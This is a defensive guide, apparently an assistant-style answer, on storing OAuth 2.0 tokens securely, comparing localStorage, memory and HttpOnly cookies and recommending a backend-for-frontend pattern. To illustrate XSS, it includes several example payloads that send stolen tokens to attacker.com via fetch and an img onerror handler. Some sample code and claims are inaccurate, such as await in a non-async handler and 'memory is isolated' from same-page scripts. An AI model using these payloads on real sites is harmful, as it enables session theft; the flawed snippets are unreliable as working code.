# Token Storage in OAuth 2.0: Security Deep Dive

## Quick Answer

**YES, tokens are stored somewhere in the browser/app, but WHERE you store them matters ENORMOUSLY for security.**

---

## Where Tokens Can Be Stored

### 1. **localStorage** ❌ VULNERABLE

```javascript
// After OAuth login, app stores token:
localStorage.setItem('access_token', 'eyJhbGc...');
localStorage.setItem('refresh_token', 'abc123...');

// Later, app retrieves it:
const token = localStorage.getItem('access_token');
fetch('/api/user', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**Why it's stored there:**
- Persists across browser restarts
- Accessible across tabs/windows
- Simple to use

**Security problem - XSS (Cross-Site Scripting):**
```javascript
// Attacker injects malicious script (via comment, ad, or vulnerability)
// Any JavaScript on your page can read localStorage
const stolenToken = localStorage.getItem('access_token');

// Attacker sends it to their server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});

// Attacker now has your token and can:
// - Access your data indefinitely
// - Impersonate you
// - Make purchases on your behalf
// - Read/modify your files
```

**Why XSS happens:**
```html
<!-- Vulnerable to XSS -->
<comment>{{ userInput }}</comment>

<!-- Attacker submits: -->
<img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))">

<!-- OR in React if not escaped -->
<div dangerouslySetInnerHTML={{ __html: userInput }} />

<!-- OR dependency vulnerability -->
<!-- Popular npm package has security flaw that allows code injection -->
```

---

### 2. **sessionStorage** ❌ SIMILARLY VULNERABLE

```javascript
sessionStorage.setItem('access_token', 'eyJhbGc...');
```

**Difference from localStorage:**
- Cleared when browser tab closes (slightly better)
- Still accessible to all JavaScript on the page
- Still vulnerable to XSS

**Example XSS attack (same as above):**
```javascript
const token = sessionStorage.getItem('access_token'); // ← XSS can steal this
```

---

### 3. **Memory (Variable)** ⚠️ LIMITED PROTECTION

```javascript
let accessToken = null;  // Stored in memory only
let refreshToken = null;

// After OAuth login:
accessToken = response.access_token;
refreshToken = response.refresh_token;

// Use in requests:
fetch('/api/user', {
  headers: { 'Authorization': `Bearer ${accessToken}` }
});
```

**Advantages:**
- Not accessible to JavaScript from other tabs (isolated)
- Not persistent (tokens lost on page refresh)
- Not vulnerable to localStorage/sessionStorage theft
- Not visible in browser console history

**Disadvantages:**
- Lost on page refresh ❌ (bad user experience)
- Lost on browser tab close ❌
- Can still be accessed by XSS on the same page

**When XSS happens on this page:**
```javascript
// Attacker's script runs on the same page
accessToken // Still accessible to malicious code running here
```

**Mitigated approach: Use memory + refresh token in secure cookie**

---

### 4. **HttpOnly Secure Cookies** ✅ BEST PRACTICE

```
Server sets cookie in response:

HTTP/1.1 200 OK
Set-Cookie: refresh_token=abc123def456; 
  HttpOnly;           // ← JavaScript CANNOT access
  Secure;             // ← Only sent over HTTPS
  SameSite=Strict;    // ← Prevents CSRF
  Max-Age=604800;     // ← Expires in 7 days
  Domain=.app.com;    // ← Only sent to app.com domains
  Path=/;             // ← Sent with all requests
```

**How it works:**
```javascript
// Browser automatically includes cookie with requests
fetch('/api/user', {
  credentials: 'include'  // ← Include cookies in request
  // Cookie is sent automatically, not accessible to JavaScript
});

// Attacker tries to steal it:
document.cookie  // ← "empty" (HttpOnly cookies hidden)
localStorage.getItem('refresh_token')  // ← null (token not in localStorage)

// Result: Attacker gets nothing! ✓
```

**Why HttpOnly is secure:**
- Browser prevents JavaScript from reading it (automatic)
- Even if XSS attack happens, attacker can't access the cookie
- Only sent to the server (not accessible to JavaScript)
- Immune to localStorage theft

---

## Recommended Token Storage Architecture (2024 Best Practice)

### **The BFF (Backend-for-Frontend) Pattern**

```
┌─────────────────────────────────────────────────────────────────┐
│                         Browser (Client)                        │
│                                                                 │
│  ┌──────────────┐       ┌──────────────────────┐               │
│  │ React/Vue    │──────→│  BFF (Your Backend)  │               │
│  │ (SPA)        │←──────│  Node.js/Python etc  │               │
│  │              │       │                      │               │
│  │ Access token │       │ • Receives OAuth code│               │
│  │ in MEMORY    │       │ • Exchanges for token│               │
│  │              │       │ • Stores refresh     │               │
│  └──────────────┘       │   in HttpOnly cookie │               │
│                         │ • Proxies API calls  │               │
│                         └──────────────────────┘               │
│                                                                 │
│                        Memory + Secure Cookie                  │
└─────────────────────────────────────────────────────────────────┘
                                 ↓
                    ┌────────────────────────┐
                    │  OAuth Provider        │
                    │  (Google, Auth0, etc)  │
                    └────────────────────────┘
                                 ↓
                    ┌────────────────────────┐
                    │  Resource Server       │
                    │  (API with data)       │
                    └────────────────────────┘
```

**Step-by-step flow:**

```
1. User clicks "Login with Google"
   SPA redirects to Google OAuth

2. User authenticates and grants permission
   Google redirects back with authorization code:
   https://myapp.com/callback?code=AUTH_CODE

3. SPA's callback route passes code to BFF:
   POST https://myapp.com/api/auth/callback
   { code: "AUTH_CODE" }

4. BFF (backend) does the exchange:
   POST https://accounts.google.com/token
   {
     client_id: BACKEND_CLIENT_ID,
     client_secret: BACKEND_CLIENT_SECRET,  // ← Never exposed to browser
     code: AUTH_CODE,
     grant_type: "authorization_code"
   }

5. Google responds with tokens:
   {
     access_token: "eyJhbGc...",     // ← Short-lived
     refresh_token: "1//0gZ...",     // ← Long-lived
     expires_in: 3600
   }

6. BFF stores tokens:
   - access_token in MEMORY (not in DB)
   - refresh_token in HttpOnly secure cookie
   
   Returns to SPA:
   {
     access_token: "eyJhbGc...",  // Shorter-lived copy for SPA
     expires_in: 300              // 5 minutes
   }
   
   + Sets cookie:
   Set-Cookie: refresh_token=1//0gZ...; HttpOnly; Secure; SameSite=Strict

7. SPA stores access_token in MEMORY:
   let accessToken = "eyJhbGc...";

8. SPA makes API calls to BFF (not directly to Google API):
   GET /api/user
   Authorization: Bearer eyJhbGc...
   [Cookie: refresh_token=1//0gZ... automatically included]

9. BFF validates access_token (in memory)
   - If valid: returns data
   - If expired: uses refresh_token (from cookie) to get new access_token

10. When access_token expires:
    BFF uses refresh_token to get new tokens from Google
    Updates its own memory and cookie
    SPA just makes the API call (transparent refresh)
```

**Code example - BFF implementation:**

```javascript
// ===== BACKEND (Node.js + Express) =====

app.post('/api/auth/callback', async (req, res) => {
  const { code } = req.body;
  
  try {
    // Step 1: Exchange code for tokens (backend only)
    const tokenResponse = await fetch('https://accounts.google.com/token', {
      method: 'POST',
      body: new URLSearchParams({
        client_id: process.env.GOOGLE_CLIENT_ID,
        client_secret: process.env.GOOGLE_CLIENT_SECRET,  // ← Secure
        code: code,
        grant_type: 'authorization_code',
        redirect_uri: 'https://myapp.com/callback'
      })
    });
    
    const tokens = await tokenResponse.json();
    
    // Step 2: Store refresh token in HttpOnly cookie
    res.setHeader('Set-Cookie', 
      `refresh_token=${tokens.refresh_token}; ` +
      'HttpOnly; Secure; SameSite=Strict; Max-Age=604800; Path=/; ' +
      'Domain=.myapp.com'
    );
    
    // Step 3: Keep access_token in backend memory (not in DB)
    const backendMemory = {
      userId: extractUserIdFromToken(tokens.access_token),
      accessToken: tokens.access_token,
      expiresAt: Date.now() + tokens.expires_in * 1000,
      refreshToken: tokens.refresh_token  // Also in memory
    };
    
    // Step 4: Return SHORT-LIVED token for frontend
    res.json({
      accessToken: tokens.access_token,
      expiresIn: 300  // 5 minutes (shorter than Google's 1 hour)
    });
    
  } catch (error) {
    res.status(401).json({ error: 'Auth failed' });
  }
});

// Middleware to refresh expired tokens
app.use(async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token || isTokenExpired(token)) {
    const refreshToken = req.cookies.refresh_token;
    
    if (!refreshToken) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    
    // Use refresh token to get new access token
    const newTokens = await fetch('https://accounts.google.com/token', {
      method: 'POST',
      body: new URLSearchParams({
        client_id: process.env.GOOGLE_CLIENT_ID,
        client_secret: process.env.GOOGLE_CLIENT_SECRET,
        refresh_token: refreshToken,
        grant_type: 'refresh_token'
      })
    }).then(r => r.json());
    
    // Update backend memory
    req.user = { accessToken: newTokens.access_token };
  }
  
  next();
});

// API endpoint that frontend calls
app.get('/api/user', (req, res) => {
  // BFF proxies to Google API with access_token
  const response = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
    headers: { Authorization: `Bearer ${req.user.accessToken}` }
  });
  
  res.json(await response.json());
});

// ===== FRONTEND (React) =====

function useAuth() {
  const [accessToken, setAccessToken] = useState(null);  // ← Memory storage
  
  async function login() {
    // Step 1: Redirect to OAuth
    window.location = `https://accounts.google.com/o/oauth2/v2/auth?
      client_id=${FRONTEND_CLIENT_ID}&
      redirect_uri=https://myapp.com/callback&
      response_type=code&
      scope=openid email`;
  }
  
  async function handleCallback(code) {
    // Step 2: Send code to BFF
    const response = await fetch('/api/auth/callback', {
      method: 'POST',
      body: JSON.stringify({ code }),
      credentials: 'include'  // ← Include refresh_token cookie
    });
    
    const { accessToken, expiresIn } = await response.json();
    
    // Step 3: Store in memory (not localStorage)
    setAccessToken(accessToken);
    
    // Step 4: Schedule refresh before expiration
    setTimeout(() => {
      refreshAccessToken();
    }, expiresIn * 1000 * 0.9);  // Refresh at 90% of lifetime
  }
  
  async function refreshAccessToken() {
    // Frontend requests new access token from BFF
    // BFF uses refresh_token cookie to get new tokens from Google
    const response = await fetch('/api/refresh', {
      credentials: 'include'  // ← Include refresh_token cookie
    });
    
    const { accessToken, expiresIn } = await response.json();
    setAccessToken(accessToken);
    
    // Reschedule refresh
    setTimeout(() => refreshAccessToken(), expiresIn * 1000 * 0.9);
  }
  
  async function apiCall(endpoint) {
    return fetch(`/api${endpoint}`, {
      headers: {
        'Authorization': `Bearer ${accessToken}`  // ← From memory
      },
      credentials: 'include'  // ← Include refresh_token cookie
    });
  }
  
  return { login, apiCall, isLoggedIn: !!accessToken };
}
```

---

## Comparison: All Storage Methods

| Storage Method | XSS Vulnerable? | CSRF Vulnerable? | Persistent? | Cross-tab? | Best For |
|---|---|---|---|---|---|
| **localStorage** | ✓ YES | Yes | Yes | Yes | ❌ NOT RECOMMENDED |
| **sessionStorage** | ✓ YES | Yes | No | No | ❌ NOT RECOMMENDED |
| **Memory** | ✓ YES (same page) | No | ❌ NO | No | ✓ Access token (short-lived) |
| **HttpOnly Cookie** | ❌ NO | ⚠️ Mitigated by SameSite | Yes | Yes | ✓ Refresh token (long-lived) |
| **Native App Keychain** | ❌ NO | N/A | Yes | N/A | ✓ Mobile apps |

---

## XSS Protection Layers (Defense in Depth)

### Layer 1: Content Security Policy (CSP)

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';
">
```

**Prevents:**
- Inline `<script>` tags
- External script injection
- Eval() exploitation
- Unsafe DOM manipulation

**Even if attacker injects code, CSP limits what it can do:**
```javascript
// Attacker tries this - BLOCKED by CSP
fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
// ← connect-src 'self' only allows requests to myapp.com

// But... tokens in memory can still be accessed if XSS on same domain
// That's why we use HttpOnly cookies for refresh token
```

### Layer 2: HttpOnly Cookies

```javascript
// Even with XSS on myapp.com
document.cookie  // ← Cannot see HttpOnly cookies

// Result: Attacker can't steal refresh token
```

### Layer 3: Short-lived Access Tokens in Memory

```javascript
// Access token in memory expires in 5-15 minutes
// Even if stolen, attacker can only use it briefly
```

### Layer 4: Token Binding / DPoP

```javascript
// Future improvement: Each request includes proof
// Token only works from the specific device/key that requested it
// Stolen token can't be used from attacker's server
```

---

## Native Mobile Apps (iOS/Android)

### iOS - Keychain

```swift
// Store refresh token in Keychain (encrypted by OS)
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "refresh_token",
    kSecValueData as String: refreshToken.data(using: .utf8)!
]

SecItemAdd(query as CFDictionary, nil)

// Retrieve it
let query = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "refresh_token",
    kSecReturnData as String: true
]
var result: AnyObject?
SecItemCopyMatching(query as CFDictionary, &result)
let token = String(data: result as! Data, encoding: .utf8)
```

**Benefits:**
- Encrypted by OS
- Isolated per app
- Can require biometric auth
- Survives app updates

### Android - EncryptedSharedPreferences

```kotlin
val encryptedSharedPreferences = EncryptedSharedPreferences.create(
    context,
    "secret_shared_prefs",
    MasterKey.Builder(context).setKeyScheme(MasterKey.KeyScheme.AES256_GCM).build(),
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)

encryptedSharedPreferences.edit().putString("refresh_token", token).apply()
```

---

## Common Mistakes & Fixes

### ❌ Mistake 1: Storing access_token in localStorage

```javascript
// WRONG
localStorage.setItem('access_token', token);
```

**Why:** XSS attack can steal it

**Fix:**
```javascript
// RIGHT - memory only
let accessToken = token;
```

---

### ❌ Mistake 2: Accessing token in URL

```
// WRONG
GET /api/user?token=eyJhbGc...
```

**Why:** 
- Logged in browser history
- Visible to anyone with access to history
- Proxies see it
- Browser extensions see it

**Fix:**
```javascript
// RIGHT - Authorization header
fetch('/api/user', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

---

### ❌ Mistake 3: Storing refresh_token in localStorage

```javascript
// WRONG
localStorage.setItem('refresh_token', refreshToken);
```

**Why:** Long-lived, accessible to XSS

**Fix:**
```javascript
// RIGHT - HttpOnly secure cookie (set by server)
// Server sends: Set-Cookie: refresh_token=...; HttpOnly; Secure;
// JavaScript can't access it
```

---

### ❌ Mistake 4: Not refreshing tokens

```javascript
// WRONG - access token used indefinitely
const response = await fetch('/api/user', {
  headers: { 'Authorization': `Bearer ${staticAccessToken}` }
});
```

**Why:** If token is leaked, attacker has unlimited access

**Fix:**
```javascript
// RIGHT - tokens expire and are refreshed
if (isTokenExpired(accessToken)) {
  await refreshToken();  // Uses refresh_token from cookie
}

const response = await fetch('/api/user', {
  headers: { 'Authorization': `Bearer ${accessToken}` }
});
```

---

### ❌ Mistake 5: Frontend talking directly to OAuth provider

```javascript
// WRONG - frontend does OAuth exchange
const response = await fetch('https://accounts.google.com/token', {
  method: 'POST',
  body: JSON.stringify({
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,  // ← EXPOSED IN BROWSER!
    code: authCode
  })
});
```

**Why:** client_secret visible in browser source code

**Fix:**
```javascript
// RIGHT - backend does OAuth exchange
const response = await fetch('/api/auth/callback', {
  method: 'POST',
  body: JSON.stringify({ code: authCode })
  // Server has client_secret, tokens are secure
});
```

---

## Real-World Attack Scenario

### Scenario: Malicious Ad Network Injects XSS

```
1. Website uses ad network for monetization
2. Ad network has security vulnerability
3. Attacker buys ad space
4. Ad serves malicious JavaScript:

<script>
  // This script runs on the website
  
  // Attacker tries to steal token stored in localStorage
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal', { 
    method: 'POST',
    body: token 
  });
</script>
```

### If tokens are in localStorage: ❌ COMPROMISED

```
Attacker gets:
  - Full access_token (can access all your data)
  - Can impersonate user indefinitely
  - Steals personal information
  - Makes unauthorized purchases
```

### If tokens are using BFF pattern: ✓ PROTECTED

```
Scenario A: Access token in memory
  - Attacker can't read it (memory is isolated, not accessible to other scripts)
  - But if attacker's script runs on the same page, they could still intercept API calls
  
Scenario B: Refresh token in HttpOnly cookie
  - Attacker can't steal it (HttpOnly prevents JavaScript access)
  - Can't use it to get new tokens
  
Scenario C: Attacker tries to make API calls as user
  - API calls go through BFF
  - BFF uses short-lived access tokens
  - BFF validates each request
  - Even if attacker steals a token, they can only use it for 5-15 minutes
  - BFF detects abuse patterns (multiple requests from different locations)
  
Result: MINIMAL EXPOSURE, QUICKLY DETECTED
```

---

## Best Practice Checklist

✓ **Access Token (short-lived, 5-15 minutes)**
- Storage: Memory (in frontend) OR Session variable (in backend)
- Never in URL
- Never in localStorage
- Sent in Authorization header

✓ **Refresh Token (long-lived, days/weeks)**
- Storage: HttpOnly Secure Cookie
- Never in JavaScript
- Server handles refresh automatically
- Rotated on each use

✓ **Client Secret**
- Storage: Backend only
- Never in frontend code
- Never committed to git
- Use environment variables

✓ **Authentication Code**
- Exchange on backend immediately
- Single-use only
- Short-lived (10 minutes)
- HTTPS only

✓ **Additional Protections**
- Content Security Policy enabled
- HTTPS everywhere
- PKCE for public clients
- State parameter for CSRF
- SameSite cookies
- Monitor for anomalies

---

## Summary

| Question | Answer |
|----------|--------|
| **Are tokens stored in UI?** | Yes, but WHERE matters a lot |
| **Where should access token go?** | Memory (frontend) or variable (backend) - short-lived |
| **Where should refresh token go?** | HttpOnly secure cookie - long-lived, inaccessible to JS |
| **Why not localStorage?** | XSS attacks can steal it |
| **Why not sessionStorage?** | Same as localStorage - vulnerable to XSS |
| **Why HttpOnly cookies?** | JavaScript can't access them, even with XSS |
| **What if XSS still happens?** | Attacker can't steal refresh token; access token is short-lived; abuse detected quickly |

**The key insight**: You can't prevent XSS completely, so design your system assuming XSS WILL happen. Use defense in depth: HttpOnly cookies for sensitive tokens, short lifetimes, monitoring, and immediate detection.
